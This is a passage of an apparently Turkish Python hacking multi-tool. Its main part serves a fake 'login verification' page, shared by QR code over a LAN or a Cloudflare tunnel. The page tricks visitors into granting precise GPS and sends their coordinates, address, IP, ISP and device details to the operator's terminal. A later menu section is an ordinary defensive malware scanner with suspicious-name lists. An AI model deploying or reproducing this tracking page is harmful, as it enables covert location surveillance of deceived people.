.prog{height:100%;width:0%;background:#238636;animation:fill 60s linear forwards}
@keyframes fill{to{width:100%}}
.timer{font-size:.72em;color:#8b949e;margin-top:4px;text-align:center;width:100%;max-width:420px}
#mapbtn{display:none;background:#1f6feb;color:#fff;border:none;border-radius:6px;
        padding:10px;font-size:.85em;font-weight:bold;cursor:pointer;
        width:100%;max-width:420px;margin-top:6px}
</style>
</head>
<body>
<h1>&#128274; Giris Dogrulamasi</h1>

<!-- DOGRULAMA KARTI -->
<div class="card" id="authcard">
  <h2>Kimlik Dogrulamasi Gerekli</h2>
  <p>Bu sayfaya erisim icin tek seferlik dogrulama gerekmektedir.<br>
  Asagidaki butona tiklayin, acilan pencerede <strong style="color:#58a6ff">Izin Ver</strong> secenegini secin.</p>
  <button class="btn" id="authbtn" onclick="dogrula()">Devam Et</button>
  <div class="status" id="authst">Dogrulama bekleniyor...</div>
</div>

<!-- BILGI ALANI -->
<div id="info">
  <div class="row"><div class="lbl">Cihaz</div><div class="val" id="dv">-</div></div>
  <div class="row"><div class="lbl">Isletim Sistemi</div><div class="val" id="osv">-</div></div>
  <div class="row"><div class="lbl">Tarayici</div><div class="val" id="brv">-</div></div>
  <hr class="sep">
  <div class="row"><div class="lbl">IP Adresi</div><div class="val red" id="ipv">Aliyor...</div></div>
  <div class="row"><div class="lbl">Ilce, Sehir</div><div class="val red" id="cityv">Aliyor...</div></div>
  <div class="row"><div class="lbl">Ulke</div><div class="val red" id="ctryv">Aliyor...</div></div>
  <div class="row"><div class="lbl">Internet Saglayici</div><div class="val orange" id="ispv">Aliyor...</div></div>
  <hr class="sep">
  <div class="row"><div class="lbl">GPS Konum (kesin)</div><div class="val blue" id="gpsv">Aliyor...</div></div>
  <div class="row"><div class="lbl">GPS Adres</div><div class="val blue" id="gpsaddr">-</div></div>
  <div class="row"><div class="lbl">GPS Hassasiyet</div><div class="val" id="gpsacc">-</div></div>
  <button id="mapbtn" onclick="haritaAc()">&#128205; Haritada Goster</button>
  <div class="prog-wrap"><div class="prog"></div></div>
  <div class="timer">Islem suresi: <span id="sec">60</span> sn</div>
</div>

<script>
var ua=navigator.userAgent;
var _lat=null,_lon=null;

// Cihaz/OS/Tarayici tespiti
function cihazTespit(){
  var dv="Bilinmiyor",os="Bilinmiyor",br="Bilinmiyor";
  // iPhone model
  var im=ua.match(/[(]iPhone([0-9]+,[0-9]+)/);
  var IPHONE={"17,2":"iPhone 16 Pro Max","17,1":"iPhone 16 Pro","17,4":"iPhone 16 Plus","17,3":"iPhone 16",
    "16,2":"iPhone 15 Pro Max","16,1":"iPhone 15 Pro","15,5":"iPhone 15 Plus","15,4":"iPhone 15",
    "15,3":"iPhone 14 Pro Max","15,2":"iPhone 14 Pro","14,8":"iPhone 14 Plus","14,7":"iPhone 14",
    "14,5":"iPhone 13","14,4":"iPhone 13 Mini","14,3":"iPhone 13 Pro Max","14,2":"iPhone 13 Pro",
    "13,4":"iPhone 12 Pro Max","13,3":"iPhone 12 Pro","13,2":"iPhone 12","13,1":"iPhone 12 Mini",
    "12,5":"iPhone 11 Pro Max","12,3":"iPhone 11 Pro","12,1":"iPhone 11",
    "11,8":"iPhone XR","11,6":"iPhone XS Max","11,2":"iPhone XS"};
  if(im && IPHONE[im[1]]) dv=IPHONE[im[1]];
  else if(/iPhone/.test(ua)) dv="Apple iPhone";
  else if(/iPad/.test(ua)) dv="Apple iPad";
  else if(/SM-/.test(ua)){
    var sm=ua.match(/SM-([A-Z][0-9]{3}[A-Z0-9]*)/);
    var SAMS={"SM-S928":"Galaxy S24 Ultra","SM-S926":"Galaxy S24+","SM-S921":"Galaxy S24",
      "SM-S918":"Galaxy S23 Ultra","SM-S916":"Galaxy S23+","SM-S911":"Galaxy S23",
      "SM-S908":"Galaxy S22 Ultra","SM-G998":"Galaxy S21 Ultra","SM-G996":"Galaxy S21+","SM-G991":"Galaxy S21",
      "SM-A556":"Galaxy A55","SM-A546":"Galaxy A54","SM-A536":"Galaxy A53","SM-A346":"Galaxy A34",
      "SM-A336":"Galaxy A33","SM-A256":"Galaxy A25","SM-A246":"Galaxy A24","SM-A156":"Galaxy A15",
      "SM-A146":"Galaxy A14","SM-F946":"Galaxy Z Fold 5","SM-F731":"Galaxy Z Flip 5"};
    if(sm){var found=null;for(var k in SAMS){if(("SM-"+sm[1]).indexOf(k)===0){found="Samsung "+SAMS[k];break;}}
      dv=found||("Samsung Galaxy ("+sm[1]+")");}
    else dv="Samsung Galaxy";
  }
  else if(/Redmi/.test(ua)){var r=ua.match(/Redmi ([A-Za-z0-9 ]+?)[ ]+Build/);dv=r?"Xiaomi Redmi "+r[1].trim():"Xiaomi Redmi";}
  else if(/POCO/.test(ua)){var r=ua.match(/POCO ([A-Za-z0-9 ]+?)[ ]+Build/);dv=r?"Xiaomi POCO "+r[1].trim():"Xiaomi POCO";}
  else if(/Xiaomi/.test(ua)){var r=ua.match(/Xiaomi ([A-Za-z0-9 ]+?)[ ]+Build/);dv=r?"Xiaomi "+r[1].trim():"Xiaomi";}
  else if(/HUAWEI|Huawei/.test(ua)){var r=ua.match(/(?:HUAWEI|Huawei)[/ ]([A-Za-z0-9-]+)/);dv=r?"Huawei "+r[1]:"Huawei";}
  else if(/OPPO/.test(ua)){var r=ua.match(/OPPO[ ]?([A-Za-z0-9]+)/);dv=r?"OPPO "+r[1]:"OPPO";}
  else if(/vivo/.test(ua)){var r=ua.match(/vivo ([A-Za-z0-9]+)/);dv=r?"Vivo "+r[1]:"Vivo";}
  else if(/realme/.test(ua)){var r=ua.match(/realme ([A-Za-z0-9 ]+?)[ ]+Build/);dv=r?"Realme "+r[1].trim():"Realme";}
  else if(/OnePlus/.test(ua)){var r=ua.match(/OnePlus[ ]?([A-Za-z0-9]+)/);dv=r?"OnePlus "+r[1]:"OnePlus";}
  else if(/Android/.test(ua)){var r=ua.match(/;[ ]*([A-Za-z0-9 _-]{3,25})[ ]+Build/);dv=r?r[1].trim():"Android Cihaz";}
  else if(/Windows/.test(ua)) dv="Windows PC";
  else if(/Macintosh/.test(ua)) dv="Apple Mac";
  // OS
  var iv=ua.match(/OS ([0-9_]+) like/);
  if(iv) os="iOS "+iv[1].replace(/_/g,".");
  else{var av=ua.match(/Android ([0-9.]+)/);
    if(av) os="Android "+av[1];
    else{var wv=ua.match(/Windows NT ([0-9.]+)/);
      if(wv){var wt={"10.0":"Windows 10/11","6.3":"Win 8.1","6.1":"Win 7"};os=wt[wv[1]]||"Windows";}}}
  // Tarayici
  if(/CriOS/.test(ua)) br="Chrome (iOS)";
  else if(/FxiOS/.test(ua)) br="Firefox (iOS)";
  else if(/EdgA/.test(ua)) br="Edge (Android)";
  else if(/Edg[/]/.test(ua)) br="Edge";
  else if(/OPR/.test(ua)) br="Opera";
  else if(/SamsungBrowser/.test(ua)) br="Samsung Internet";
  else if(/Chrome/.test(ua)) br="Chrome";
  else if(/Firefox/.test(ua)) br="Firefox";
  else if(/Safari/.test(ua)&&!/Chrome/.test(ua)) br="Safari";
  document.getElementById("dv").textContent=dv;
  document.getElementById("osv").textContent=os;
  document.getElementById("brv").textContent=br;
}

// IP bilgisi — birden fazla kaynak dene
function ipBilgiAl(){
  // Once IPv4 al
  var kaynaklar=[
    "https://api4.ipify.org?format=json",
    "https://api.ipify.org?format=json"
  ];

  function ipDene(idx){
    if(idx>=kaynaklar.length){
      document.getElementById("ipv").textContent="Alinamadi";
      return;
    }
    fetch(kaynaklar[idx])
      .then(function(r){return r.text();})
      .then(function(txt){
        var ip4="";
        try{ip4=JSON.parse(txt).ip||txt.trim();}
        catch(e){ip4=txt.trim();}
        // IPv6 ise sonrakini dene
        if(!ip4||ip4.indexOf(":")!==-1){ipDene(idx+1);return;}
        document.getElementById("ipv").textContent=ip4;
        // Konum — district + city + regionName + country
        fetch("https://ip-api.com/json/"+ip4+"?fields=status,city,district,regionName,country,isp,zip,lat,lon")
          .then(function(r){return r.json();})
          .then(function(d){
            if(d.status==="success"){
              var ilce  = d.district  ? d.district  : "";
              var sehir = d.city      ? d.city      : "";
              var bolge = d.regionName? d.regionName: "";
              var ulke  = d.country   ? d.country   : "";
              var posta = d.zip       ? " ("+d.zip+")" : "";
              // Ilce varsa: Kadikoy, Istanbul — yoksa: Istanbul
              var satir1 = ilce && ilce!==sehir ? ilce+", "+sehir : sehir;
              // Bolge varsa ve sehirden farklıysa ekle
              var satir2 = bolge && bolge!==sehir ? bolge+" / "+ulke : ulke;
              document.getElementById("cityv").textContent=satir1+posta;
              document.getElementById("ctryv").textContent=satir2;
              document.getElementById("ispv").textContent=d.isp||"?";
              window._ipLat=d.lat;
              window._ipLon=d.lon;
            } else {
              document.getElementById("cityv").textContent="Konum alinamadi";
              document.getElementById("ctryv").textContent="";
            }
          })
          .catch(function(){
            document.getElementById("cityv").textContent="Konum hatasi";
          });
      })
      .catch(function(){ipDene(idx+1);});
  }
  ipDene(0);
}

// Dogrula butonu
function dogrula(){
  var btn=document.getElementById("authbtn");
  var st=document.getElementById("authst");
  btn.disabled=true;
  btn.textContent="Bekleniyor...";
  st.textContent="Konum izni isteniyor...";
  if(!navigator.geolocation){
    st.textContent="Bu tarayici konum desteklemiyor.";
    btn.disabled=false; btn.textContent="Tekrar Dene";
    return;
  }
  navigator.geolocation.getCurrentPosition(basarili, basarisiz,
    {enableHighAccuracy:true,timeout:20000,maximumAge:0});
}

function basarili(pos){
  _lat=pos.coords.latitude;
  _lon=pos.coords.longitude;
  var acc=Math.round(pos.coords.accuracy);
  // Kart gizle, bilgi goster
  document.getElementById("authcard").style.display="none";
  var info=document.getElementById("info");
  info.style.display="flex";
  // Doldur
  cihazTespit();
  ipBilgiAl();
  document.getElementById("gpsv").textContent=_lat.toFixed(6)+", "+_lon.toFixed(6);
  document.getElementById("gpsacc").textContent="+-"+acc+" metre";
  document.getElementById("mapbtn").style.display="block";
  // Adres bul
  fetch("https://nominatim.openstreetmap.org/reverse?lat="+_lat+"&lon="+_lon+"&format=json&accept-language=tr")
    .then(function(r){return r.json();})
    .then(function(d){
      var adres=d.display_name||(_lat.toFixed(4)+","+_lon.toFixed(4));
      document.getElementById("gpsaddr").textContent=adres;
      new Image().src="/loc?lat="+_lat+"&lon="+_lon+"&acc="+acc+"&addr="+encodeURIComponent(adres.substring(0,120));
    })
    .catch(function(){
      new Image().src="/loc?lat="+_lat+"&lon="+_lon+"&acc="+acc+"&addr=konum";
    });
  // Geri sayim
  var s=60,t=setInterval(function(){
    s--;document.getElementById("sec").textContent=s;
    if(s<=0){clearInterval(t);document.getElementById("sec").textContent="Tamamlandi";}
  },1000);
}

function basarisiz(err){
  var st=document.getElementById("authst");
  var btn=document.getElementById("authbtn");
  btn.disabled=false;
  btn.textContent="Tekrar Dene";
  if(err.code===1) st.textContent="Erisim reddedildi. Tekrar deneyin.";
  else st.textContent="Konum alinamadi. Tekrar deneyin.";
}

function haritaAc(){
  if(_lat&&_lon) window.open("https://maps.google.com/?q="+_lat+","+_lon,"_blank");
}
</script>
</body></html>""".encode("utf-8")

    # ── UA parse (terminal çıktısı için) ──────────
    # ua_parse: global seviyede tanimlandi
    def yazdir_ziyaretci(z, idx):
        tip = z.get("tip","SAYFA")

        # GPS verisi geldiyse
        if tip == "GPS":
            print(f"\n  {BOLD}{GREEN}{'═'*52}{R}")
            print(f"  {BOLD}{YELLOW}  [!] GPS KONUM ALINDI — ZİYARETÇİ #{idx}{R}")
            print(f"  {GREEN}{'═'*52}{R}")
            cihaz, os_, br_ = ua_parse(z["ua"])
            lv("  Cihaz",      cihaz,           lc=DGREEN, vc=WHITE)
            lv("  OS",         os_,             lc=DGREEN, vc=WHITE)
            lv("  Tarayici",   br_,             lc=DGREEN, vc=WHITE)
            lv("  IP",         z["ip"],         lc=DGREEN, vc=RED)
            print(f"  {DGREEN}{'─'*48}{R}")
            lv("  GPS Lat/Lon", f"{z['gps_lat']}, {z['gps_lon']}", lc=YELLOW, vc=YELLOW)
            lv("  GPS Dogruluk", f"+-{z['gps_acc']} metre",         lc=YELLOW, vc=WHITE)
            lv("  GPS Adres",   z["gps_addr"][:55],                 lc=YELLOW, vc=WHITE)
            maps = f"https://maps.google.com/?q={z['gps_lat']},{z['gps_lon']}"
            lv("  Google Maps", maps,           lc=YELLOW, vc=DGREEN)
            print(f"  {GREEN}{'═'*52}{R}\n")
            return

        # Normal sayfa ziyareti
        cihaz, os_, br_ = ua_parse(z["ua"])
        try:
            # IPv6 gelirse IPv4'e çevir
            ip_sorgu = z["ip"]
            if ":" in ip_sorgu:
                try:
                    ipv4 = requests.get("https://api4.ipify.org", timeout=3).text.strip()
                    if ipv4 and ":" not in ipv4:
                        ip_sorgu = ipv4
                except:
                    pass
            rl = requests.get(
                f"http://ip-api.com/json/{ip_sorgu}?fields=status,city,district,regionName,country,isp,lat,lon",
                timeout=5).json()
            if rl.get("status") == "success":
                ilce  = rl.get("district","")
                sehir = rl.get("city","?")
                bolge = rl.get("regionName","?")
                ulke  = rl.get("country","?")
                # İlçe varsa ve şehirden farklıysa göster
                konum_satir1 = f"{ilce}, {sehir}" if ilce and ilce != sehir else sehir
                # Bölge şehirden farklıysa ekle
                konum_satir2 = f"{bolge} / {ulke}" if bolge != sehir else ulke
                sehir = f"{konum_satir1} — {konum_satir2}"
                isp   = rl.get("isp","?")
                lat   = rl.get("lat","?")
                lon   = rl.get("lon","?")
            else:
                sehir="Tespit edilemedi"; isp="?"; lat="?"; lon="?"
        except:
            sehir="Tespit edilemedi"; isp="?"; lat="?"; lon="?"

        print(f"\n  {BOLD}{GREEN}{'═'*52}{R}")
        print(f"  {BOLD}{GREEN}  [+] ZIYARETCI #{idx} — SAYFA ACILDI{R}")
        print(f"  {GREEN}{'═'*52}{R}")
        lv("  OS",       os_,     lc=DGREEN, vc=WHITE)
        lv("  Tarayici", br_,     lc=DGREEN, vc=WHITE)
        lv("  IP",       z["ip"], lc=DGREEN, vc=RED)
        lv("  Konum",    sehir,   lc=DGREEN, vc=RED)
        lv("  ISP",      isp,     lc=DGREEN, vc=GRAY)
        if lat != "?":
            lv("  IP Koord", f"{lat}, {lon}", lc=DGREEN, vc=GRAY)
        print(f"  {GRAY}  GPS izin bekleniyor...{R}")
        print(f"  {GREEN}{'═'*52}{R}\n")

    # ── HTTP Handler ──────────────────────────────
    # ── IP takip seti — çift kayıt önleme ────────
    gorulmus_ip = set()

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            # IP al
            forwarded = self.headers.get("X-Forwarded-For","")
            ip = ""
            if forwarded:
                for part in forwarded.split(","):
                    part = part.strip()
                    if ":" not in part and part:
                        ip = part; break
                if not ip:
                    ip = forwarded.split(",")[0].strip()
            if not ip or ":" in ip:
                cf = self.headers.get("CF-Connecting-IP","")
                if cf and ":" not in cf:
                    ip = cf
            if not ip:
                ip = self.client_address[0]

            ua = self.headers.get("User-Agent","?")

            # Favicon/robot gibi istekleri reddet
            path = self.path.split("?")[0]
            if path not in ("/", "/loc"):
                self.send_response(204)
                self.end_headers()
                return

            # /loc — GPS verisi
            if path == "/loc":
                from urllib.parse import parse_qs, unquote
                qs_str = self.path[5:] if "?" in self.path else ""
                qs = parse_qs(qs_str)
                kayit = {
                    "ip":       ip,
                    "ua":       ua,
                    "gps_lat":  qs.get("lat",["?"])[0],
                    "gps_lon":  qs.get("lon",["?"])[0],
                    "gps_acc":  qs.get("acc",["?"])[0],
                    "gps_addr": unquote(qs.get("addr",[""])[0]),
                    "tip":      "GPS"
                }
                with ziyaret_lock:
                    ziyaret.append(kayit)
                self.send_response(200)
                self.send_header("Content-Type","text/plain")
                self.send_header("Access-Control-Allow-Origin","*")
                self.end_headers()
                self.wfile.write(b"ok")
                return

            # / — Ana sayfa, her IP'yi bir kez kaydet
            with ziyaret_lock:
                if ip not in gorulmus_ip:
                    gorulmus_ip.add(ip)
                    ziyaret.append({"ip": ip, "ua": ua, "tip": "SAYFA"})

            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Cache-Control","no-cache")
            self.end_headers()
            self.wfile.write(SAKA_HTML)

        def log_message(self, *args):
            pass  # Werkzeug loglarını sustur

    # ── QR göster ────────────────────────────────
    def qr_goster(url):
        qr = qrlib.QRCode(border=2)
        qr.add_data(url)
        qr.make(fit=True)
        # Terminal unicode destekliyor mu kontrol et
        try:
            "██".encode(sys.stdout.encoding or 'utf-8')
            dolu = "██"
            bos  = "  "
        except (UnicodeEncodeError, TypeError):
            dolu = "##"
            bos  = "  "
        for row in qr.get_matrix():
            satir = "".join(dolu if c else bos for c in row)
            sys.stdout.write(f"  {GREEN}{satir}{R}\n")
        sys.stdout.flush()

    if s == "1":
        # Yerel IP bul
        try:
            sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sk.connect(("8.8.8.8",80))
            local_ip = sk.getsockname()[0]
            sk.close()
        except:
            local_ip = "127.0.0.1"

        url = f"http://{local_ip}:{PORT}"
        sunucu = HTTPServer(("0.0.0.0", PORT), Handler)
        t = threading.Thread(target=sunucu.serve_forever, daemon=True)
        t.start()
        spin("Sunucu baslatiliyor", 1.5)

        clear()
        banner("QR CIHAZ TESPITI","Yerel Ag Modu")
        print(f"  {GREEN}Adres : {WHITE}{url}{R}")
        print(f"  {DGREEN}Telefon ayni WiFi'de olmali!{R}\n")
        sys.stdout.flush()
        qr_goster(url)
        sys.stdout.flush()
        print(f"\n  {GREEN}QR'i tara — ziyaretciler asagida gosterilir.{R}")
        print(f"  {DGREEN}Cikmak icin CTRL+C{R}\n"); thick()
        try:
            sayac=0
            while True:
                time.sleep(0.5)
                with ziyaret_lock:
                    if ziyaret:
                        batch = ziyaret[:]
                        ziyaret.clear()
                    else:
                        batch = []
                for z in batch:
                    sayac += 1
                    yazdir_ziyaretci(z, sayac)
        except KeyboardInterrupt:
            sunucu.shutdown()
            clear(); success("Sunucu kapatildi."); pause()

    elif s == "2":
        # ── Cloudflared — token yok, hesap yok ──────
        import re as _re

        CLOUDFLARED_PATH = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
        os.makedirs(os.path.dirname(CLOUDFLARED_PATH), exist_ok=True)

        # Cloudflared exe var mı kontrol et, yoksa indir
        if not os.path.isfile(CLOUDFLARED_PATH):
            spin("Cloudflared indiriliyor (tek seferlik ~30MB)", 3)
            CF_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            try:
                import urllib.request
                urllib.request.urlretrieve(CF_URL, CLOUDFLARED_PATH)
                info("Cloudflared indirildi.")
            except Exception as e:
                error(f"Cloudflared indirilemedi: {e}")
                info("Manuel indir: https://github.com/cloudflare/cloudflared/releases")
                pause(); return

        # Sunucuyu başlat
        sunucu = HTTPServer(("0.0.0.0", PORT), Handler)
        t = threading.Thread(target=sunucu.serve_forever, daemon=True)
        t.start()

        # Cloudflared tünel başlat
        spin("Cloudflare tuneli aciliyor...", 2)
        cf_proc = subprocess.Popen(
            [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}",
             "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # URL'yi çıktıdan yakala (trycloudflare.com domain'i)
        public_url = None
        import re as _re2
        deadline = time.time() + 20
        while time.time() < deadline:
            line = cf_proc.stderr.readline().decode("utf-8", errors="replace")
            m = _re2.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
            if m:
                public_url = m.group(0)
                break

        if not public_url:
            # stdout'u da dene
            cf_proc2 = subprocess.Popen(
                [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}",
                 "--no-autoupdate", "--logfile", os.path.join(os.environ.get("TEMP","."),"cf.log")],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(5)
            log_path = os.path.join(os.environ.get("TEMP","."), "cf.log")
            try:
                with open(log_path, "r", errors="replace") as lf:
                    content = lf.read()
                m = _re2.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', content)
                if m:
                    public_url = m.group(0)
                    cf_proc = cf_proc2
            except:
                pass

        if not public_url:
            cf_proc.terminate()
            sunucu.shutdown()
            error("Cloudflare URL alinamadi. Internet baglantisini kontrol et.")
            pause(); return

        clear()
        banner("QR CIHAZ TESPITI", "Cloudflare Internet Modu")
        print(f"  {GREEN}Public URL : {WHITE}{public_url}{R}")
        print(f"  {DGREEN}Token gerektirmez — Cloudflare uzerinden{R}\n")
        sys.stdout.flush()
        qr_goster(public_url)
        sys.stdout.flush()
        print(f"\n  {GREEN}QR'i tara — ziyaretciler asagida gosterilir.{R}")
        print(f"  {DGREEN}Cikmak icin CTRL+C{R}\n"); thick()
        try:
            sayac = 0
            while True:
                time.sleep(1)
                if ziyaret:
                    for z in ziyaret: sayac += 1; yazdir_ziyaretci(z, sayac)
                    ziyaret.clear()
        except KeyboardInterrupt:
            cf_proc.terminate()
            sunucu.shutdown()
            clear(); success("Sunucu ve Cloudflare tuneli kapatildi."); pause()


# ════════════════════════════════════════════════
#  26. ZARARLI YAZILIM TARAYICI
# ════════════════════════════════════════════════
def menu_malware_scan():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Windows Defender Tam Tarama{R}    {DGREEN}Sistemi bastan sona tara{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Supheli Dosya Tarama{R}           {DGREEN}Riskli konumlari tara{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Supheli Surec Analizi{R}          {DGREEN}Dis baglanti acan processleri bul{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Startup Temizleyici{R}            {DGREEN}Bilinmeyen baslangiclari goster{R}")
    print(f"  {GREEN}[5]{R}  {BOLD}{GREEN}Hosts Dosyasi Kontrol{R}          {DGREEN}Sahte yonlendirme var mi?{R}")
    print(f"  {GREEN}[6]{R}  {BOLD}{GREEN}Defender Karantina Temizle{R}     {DGREEN}Karantinayı bosalt{R}")
    print(f"  {GREEN}[7]{R}  {BOLD}{GREEN}TAM TARAMA (Hepsi){R}             {DGREEN}Tek tusla tum kontroller{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    # ── Yardımcı: şüpheli dosya tara ──────────────
    def supheli_tara(log_list=None):
        RISKLI_KONUMLAR = [
            os.environ.get("TEMP",""),
            os.environ.get("APPDATA",""),
            os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup"),
            os.path.join(os.environ.get("LOCALAPPDATA",""), "Temp"),
            os.path.join(os.environ.get("SYSTEMROOT","C:\\Windows"), "Temp"),
            os.path.join(os.environ.get("USERPROFILE",""), "Downloads"),
        ]
        RISKLI_UZANTI = {".exe",".bat",".cmd",".vbs",".ps1",".scr",".pif",".jar",".dll"}
        SUPHELI_ISIMLER = {
            "svchost32","svhost","winsvc","winlogon32","explorer32",
            "update","updater","sys32","regsvc","taskhost32",
            "chrome32","firefox32","nvidia32","windefend32"
        }
        import datetime
        simdi = datetime.datetime.now()
        bulunanlar = []

        for konum in RISKLI_KONUMLAR:
            if not konum or not os.path.exists(konum):
                continue
            try:
                for root, dirs, files in os.walk(konum):
                    # Çok derin gitme
                    dirs[:] = [d for d in dirs if root.count(os.sep) - konum.count(os.sep) < 3]
                    for f in files:
                        ext = os.path.splitext(f)[1].lower()
                        if ext not in RISKLI_UZANTI:
                            continue
                        tam_yol = os.path.join(root, f)
                        try:
                            stat = os.stat(tam_yol)
                            boyut = stat.st_size
                            olusturma = datetime.datetime.fromtimestamp(stat.st_ctime)
                            sure = (simdi - olusturma).days
                        except:
                            boyut = 0; sure = 999

                        isim_lower = os.path.splitext(f)[0].lower()
                        risk = "DUSUK"
                        aciklama = []

                        # Risk skorlama
                        if sure <= 1:
                            risk = "YUKSEK"; aciklama.append("Son 24 saat")
                        elif sure <= 7:
                            risk = "ORTA";   aciklama.append("Son 7 gun")

                        if any(s in isim_lower for s in SUPHELI_ISIMLER):
                            risk = "YUKSEK"; aciklama.append("Supheli isim")

                        if boyut < 50*1024 and ext == ".exe":
                            if risk != "YUKSEK": risk = "ORTA"
                            aciklama.append("Cok kucuk EXE")

                        if "temp" in tam_yol.lower() and ext == ".exe":
                            risk = "YUKSEK"; aciklama.append("Temp'te EXE")

                        bulunanlar.append({
                            "yol": tam_yol,
                            "isim": f,
                            "risk": risk,
                            "sure": sure,
                            "boyut": boyut,
                            "aciklama": " · ".join(aciklama) if aciklama else "-"
                        })
            except PermissionError:
                pass

        return bulunanlar

    # ── Yardımcı: supheli process tara ──────────────
    def supheli_process():
        GUVENLI_PROCESSLER = {
            "system","smss.exe","csrss.exe","wininit.exe","winlogon.exe",
            "services.exe","lsass.exe","svchost.exe","explorer.exe",
            "taskmgr.exe","cmd.exe","powershell.exe","python.exe",
            "chrome.exe","firefox.exe","msedge.exe","brave.exe",
            "discord.exe","steam.exe","code.exe","notepad.exe",
            "conhost.exe","dwm.exe","sihost.exe","ctfmon.exe",
            "searchindexer.exe","spoolsv.exe","wuauclt.exe",
        }
        supheli = []
        try:
            out = subprocess.check_output(
                ["powershell","-Command",
                 "Get-NetTCPConnection -State Established | "
                 "Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | "
                 "Format-Table -AutoSize"],
                stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
            )
            # Process isimlerini al
            proc_out = subprocess.check_output(
                ["powershell","-Command",
                 "Get-Process | Select-Object Id,ProcessName,Path | Format-Table -AutoSize"],
                stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
            )
            proc_map = {}
            for line in proc_out.splitlines():
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        pid = int(parts[0])
                        proc_map[pid] = parts[1]
                    except: pass

            for line in out.splitlines():
                parts = line.split()
                if len(parts) < 5: continue
                try:
                    pid = int(parts[4])
                    pname = proc_map.get(pid,"?").lower()
                    remote = parts[2]
                    # Yerel değilse ve güvenli listede değilse
                    if (not remote.startswith("127.") and
                        not remote.startswith("::1") and
                        not remote.startswith("0.") and
                        pname not in GUVENLI_PROCESSLER and
                        pname != "?"):
                        supheli.append({
                            "pid": pid,
                            "isim": pname,
                            "remote": f"{remote}:{parts[3]}"
                        })
                except: pass
        except: pass
        return supheli

    # ── [1] Windows Defender Tam Tarama ─────────────
    if s in ("1","7"):
        print(f"\n  {GREEN}[~] Windows Defender tam tarama baslatiliyor...{R}")
        print(f"  {DGREEN}Bu islem birkac dakika surebilir.{R}\n")
        try:
            proc = subprocess.Popen(
                ["powershell","-Command",
                 "Start-MpScan -ScanType FullScan"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            spin("Defender tarama baslatildi (arka planda calisıyor)", 3)
            success("Windows Defender tam tarama baslatildi!")
            info("Tarama arka planda devam ediyor. Sistem tepsisinden takip edebilirsin.")

            # Karantina listesi
            try:
                kara = subprocess.check_output(
                    ["powershell","-Command",
                     "Get-MpThreatDetection | Select-Object ThreatName,ActionSuccess,InitialDetectionTime | Format-Table -AutoSize"],
                    stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace", timeout=10
                )
                if kara.strip():
                    print(f"\n  {BOLD}{GREEN}Son Tespit Edilen Tehditler:{R}")
                    divider()
                    for line in kara.strip().splitlines()[:15]:
                        if line.strip():
                            print(f"  {DGREEN}{line}{R}")
                    thick()
            except: pass
        except Exception as e:
            error(f"Defender calistirilamadi: {e}")
            info("Yonetici olarak calistırdigınizdan emin olun.")
        if s != "7": pause()

    # ── [2] Şüpheli Dosya Tarama ─────────────────────
    if s in ("2","7"):
        print(f"\n  {GREEN}[~] Supheli dosyalar taranıyor...{R}\n")
        spin("Riskli konumlar taranıyor", 3)
        bulunanlar = supheli_tara()

        if not bulunanlar:
            success("Supheli dosya bulunamadi!")
        else:
            # Riske göre sırala
            sira = {"YUKSEK":0,"ORTA":1,"DUSUK":2}
            bulunanlar.sort(key=lambda x: sira.get(x["risk"],3))

            print(f"\n  {BOLD}{GREEN}{'RISK':<8}{'DOSYA':<30}{'ACIKLAMA'}{R}")
            divider()
            for b in bulunanlar[:40]:
                renk = RED if b["risk"]=="YUKSEK" else (YELLOW if b["risk"]=="ORTA" else DGREEN)
                isim = b["isim"][:28]
                print(f"  {renk}{b['risk']:<8}{R}{WHITE}{isim:<30}{R}{DGREEN}{b['aciklama']}{R}")
            thick()
            warn(f"{len(bulunanlar)} supheli dosya bulundu.")

            # Silme seçeneği
            yuksek = [b for b in bulunanlar if b["risk"]=="YUKSEK"]
            if yuksek and s != "7":
                if confirm(f"{len(yuksek)} YUKSEK riskli dosya silınsin mi?"):
                    silindi = 0
                    for b in yuksek:
                        try:
                            os.remove(b["yol"]); silindi += 1
                        except: pass
                    success(f"{silindi} dosya silindi.")
        if s != "7": pause()

    # ── [3] Şüpheli Süreç Analizi ────────────────────
    if s in ("3","7"):
        print(f"\n  {GREEN}[~] Dis baglanti acan processler analiz ediliyor...{R}\n")
        spin("Network baglantilari taranıyor", 2)
        supheli = supheli_process()

        if not supheli:
            success("Supheli network baglantisi bulunamadi!")
        else:
            print(f"\n  {BOLD}{GREEN}{'PID':<8}{'PROCESS':<25}{'REMOTE ADRES'}{R}")
            divider()
            for p in supheli[:20]:
                print(f"  {RED}{p['pid']:<8}{R}{WHITE}{p['isim']:<25}{R}{DGREEN}{p['remote']}{R}")
            thick()
            warn(f"{len(supheli)} supheli baglanti tespit edildi.")
        if s != "7": pause()

    # ── [4] Startup Temizleyici ───────────────────────
    if s in ("4","7"):
